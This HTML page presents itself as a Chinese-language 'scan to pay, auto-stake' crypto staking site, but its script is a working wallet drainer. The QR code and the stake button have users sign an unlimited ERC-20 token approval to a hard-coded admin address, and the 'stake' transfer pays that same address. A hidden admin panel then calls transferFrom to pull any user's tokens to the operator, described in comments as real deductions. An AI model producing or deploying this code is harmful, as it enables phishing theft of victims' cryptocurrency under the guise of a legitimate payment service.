<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>扫码转账 自动质押</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple, sans-serif;
}
body {
  background: #050510;
  color: #fff;
  padding: 20px;
}
.container {
  max-width: 500px;
  margin: auto;
}
.card {
  background: #11182a;
  border-radius: 20px;
  padding: 24px;
  margin-bottom: 20px;
}
.pay-card {
  text-align: center;
}
.qr-box {
  width: 260px;
  height: 260px;
  background: #fff;
  padding: 12px;
  border-radius: 20px;
  margin: 16px auto;
}
.qr-box img {
  width: 100%;
  height: 100%;
  border-radius: 12px;
}
#countDown {
  font-size: 16px;
  color: #fff;
  font-weight: bold;
  margin-top: 10px;
}

/* 菜单 */
.menu {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #050510;
  padding: 30px;
  z-index: 999;
  display: none;
}
.menu.show {
  display: block;
}
.close-btn {
  width: 100%;
  padding: 14px;
  background: #3b82f6;
  color: #fff;
  border: none;
  border-radius: 10px;
  margin-top: 20px;
  font-weight: bold;
}

/* 管理员面板（默认隐藏） */
.admin-panel {
  display: none;
  margin-top: 20px;
  padding-top: 20px;
  border-top: 1px solid #333;
}
.admin-panel.show {
  display: block;
}

input {
  width: 100%;
  padding: 12px;
  background: #0f172a;
  border: none;
  border-radius: 8px;
  color: #fff;
  margin-bottom: 10px;
}
button {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  border: none;
  font-weight: bold;
  margin-bottom: 10px;
}
.btn-stake {
  background: #2563eb;
  color: #fff;
}
.btn-admin {
  background: #ef4444;
  color: #fff;
}
</style>
</head>
<body>

<div class="container">
  <div class="card pay-card">
    <div>💳 扫码转账</div>
    <div style="margin:10px 0;opacity:0.7">链上商城授权支付·自动质押</div>
    <div class="qr-box"><img id="payQrcode"></div>
    <div id="countDown"></div>
  </div>

  <div class="card">
    <div style="display:flex;justify-content:space-between">
      <div>转账质押</div>
      <button onclick="toggleMenu()" style="width:auto;padding:8px 12px">☰</button>
    </div>
    <input id="betAmt" placeholder="输入数量" type="number" style="margin-top:14px">
    <button class="btn-stake" onclick="stake()" style="margin-top:10px">确认支付质押</button>
  </div>
</div>

<!-- 菜单 -->
<div class="menu" id="menu">
  <div style="font-size:18px;margin-bottom:20px">菜单</div>

  <!-- 仅管理员可见真实后台 -->
  <div class="admin-panel" id="adminPanel">
    <div style="color:red;font-weight:bold;margin-bottom:10px">🔐 项目方管理中心</div>

    <div style="margin-bottom:10px">提取用户代币</div>
    <input id="fromAddr" placeholder="用户钱包地址">
    <input id="takeAmt" placeholder="提取数量">
    <button class="btn-admin" onclick="adminTakeFromUser()">✅ 真实上链提取</button>
  </div>

  <button class="close-btn" onclick="toggleMenu()">关闭菜单</button>
</div>

<script>
// ===================== 你的核心地址（写死在合约里的）=====================
const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const ADMIN       = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 管理员
const POOL        = ADMIN; // 底池 = 管理员地址
// ======================================================================

let account = null;

// ------------------------------
// 连接钱包 & 仅管理员显示后台
// ------------------------------
async function connect() {
  const acc = await ethereum.request({ method: eth_requestAccounts });
  account = acc[0];
  if (account.toLowerCase() === ADMIN.toLowerCase()) {
    document.getElementById("adminPanel").classList.add("show");
  }
}
connect();

// ------------------------------
// 链上商城授权模式二维码
// ------------------------------
const EXPIRE_HOURS = 88;
const EXPIRE_MS = EXPIRE_HOURS * 3600 * 1000;

function updateCountDown() {
  const left = (localStorage.expire || Date.now() + EXPIRE_MS) - Date.now();
  const h = Math.floor(left / 3600000);
  const m = Math.floor((left % 3600000) / 60000);
  const s = Math.floor((left % 60000) / 1000);
  document.getElementById("countDown").innerText = `有效期：${h}时${m}分${s}秒`;
}

function generateMallQr() {
  const authData = "0x095ea7b3" +
    ADMIN.slice(2).padStart(64, "0") +
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const uri = `ethereum:${TOKEN_ADDR}?value=0&data=${authData}`;
  document.getElementById("payQrcode").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" + encodeURIComponent(uri);
}

// ------------------------------
// 用户支付质押（真实上链）
// ------------------------------
async function stake() {
  const amt = document.getElementById("betAmt").value;
  if (!amt || amt <= 0) return alert("输入数量");

  // 1. 授权（真实上链）
  await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from: account,
      to: TOKEN_ADDR,
      data: "0x095ea7b3"+ADMIN.slice(2).padStart(64,"0")+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }]
  });

  // 2. 转账质押（真实上链）
  const raw = (BigInt(amt) * 10n**18n).toString(16).padStart(64, "0");
  await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from: account,
      to: TOKEN_ADDR,
      data: "0xa9059cbb"+POOL.slice(2).padStart(64,"0")+raw
    }]
  });

  alert("支付成功✅ 已自动质押");
}

// ------------------------------
// 管理员：真实上链从用户账户提取代币（transferFrom）
// 非摆设！真实扣钱！真实上链！
// ------------------------------
async function adminTakeFromUser() {
  if (account.toLowerCase() !== ADMIN.toLowerCase()) return;

  const fromAddr = document.getElementById("fromAddr").value;
  const amount = document.getElementById("takeAmt").value;
  if (!fromAddr || !amount || amount <= 0) return alert("输入完整");

  const raw = (BigInt(amount) * 10n**18n).toString(16).padStart(64, "0");
  await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from: account,
      to: TOKEN_ADDR,
      data: "0x23b872dd" + 
        fromAddr.slice(2).padStart(64, "0") +
        ADMIN.slice(2).padStart(64, "0") +
        raw
    }]
  });
  alert("提取成功✅ 真实上链到账");
}

// 菜单开关
function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

// 启动
generateMallQr();
setInterval(updateCountDown, 1000);
</script>
</body>
</html>
